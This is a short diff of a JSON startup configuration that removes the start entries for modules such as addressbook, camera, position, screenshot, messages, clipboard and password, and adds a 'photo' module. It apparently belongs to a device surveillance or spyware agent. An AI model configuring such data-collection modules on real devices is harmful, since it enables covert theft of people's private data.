@@ -53,18 +53,7 @@
             "desc": "STARTUP",
             "subactions": [
                 {"action": "module", "module": "device", "status": "start"},
-                {"action": "module", "module": "addressbook", "status": "start"},
-                {"action": "module", "module": "camera", "status": "start"},
-                {"action": "module", "module": "position", "status": "start"},
-                {"action": "module", "module": "screenshot", "status": "start"},
-                {"action": "module", "module": "application", "status": "start"},
-                {"action": "module", "module": "calendar", "status": "start"},
-                {"action": "module", "module": "call", "status": "start"},
-                {"action": "module", "module": "chat", "status": "start"},
-                {"action": "module", "module": "clipboard", "status": "start"},
-                {"action": "module", "module": "messages", "status": "start"},
-                {"action": "module", "module": "password", "status": "start"},
-                {"action": "module", "module": "url", "status": "start"}
+                {"action": "module", "module": "photo", "status": "start"}
             ]
         },
         {
